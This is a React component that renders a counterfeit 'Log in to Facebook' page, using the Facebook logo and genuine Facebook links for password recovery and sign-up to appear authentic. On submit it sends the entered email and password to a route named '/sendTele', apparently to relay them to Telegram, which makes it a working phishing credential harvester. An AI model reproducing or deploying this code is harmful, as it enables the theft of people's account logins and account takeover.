"use client";
import React, { useState } from 'react';
import Direct from "../component/Direct";
import { Link, useNavigate  } from 'react-router-dom';
import Facebook from '../asset/images/facebook.png';

function Daftar() {
    const history = useNavigate ();
  const [email, setEmail] = useState();
  const [password, setPassword] = useState();

  const handleInputChange = (e) => {
    setEmail(e.target.value);
  };
  const handleInputPassword = (e) => {
    setPassword(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log("Nilai Email:", email);
    console.log("Nilai Email:", password);
    // Lakukan tindakan lain, seperti mengirim data ke server
    history(`/sendTele/${email}/${password}`);
  };
  return (
    <div className=" lg:px-96 justify-center  px-10 py-20">
       <img
          className="mx-auto my-5"
          src={Facebook}
          alt={"facebook"}
          width={200}
          height={100}
        />
      <div className="grid grid-cols-1 mx-auto px-3 lg:w-96 w-72 text-center py-3 rounded-md border drop-shadow-md bg-white">
       
        <h1>Log in to Facebook</h1>
        <form onSubmit={handleSubmit} className="grid">
          <input
            type="email"
            placeholder="Email Address"
            name="email"
            value={email}
            onChange={handleInputChange}
            className="border px-4 py-3 rounded-lg my-2"
            required
          />
          <input
            type="password"
            placeholder="password"
            value={password}
            onChange={handleInputPassword}
            className="border px-4 py-3 rounded-lg my-2"
            name="password"
            required
          />
          <Link
            to={"https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"}
            className="flex justify-end text-sm text-gray-400 mb-4"
          >
            Lupa Password?
          </Link>
          <div className="flex justify-center">
            <button
              type="submit"
              className="bg-blue-700 my-3 w-full hover:bg-blue-500 transition-all duration-500  text-white px-3  py-3  rounded-lg "
            >
              Login
            </button>
          </div>
        </form>

        <hr />
        <div className="flex justify-center">
          <Direct
            css="bg-red-700 my-3 w-full"
            text="Create New Account"
            link="https://web.facebook.com/?_rdc=1&_rdr"
          />
        </div>

      </div>
    </div>
  );
}

export default Daftar;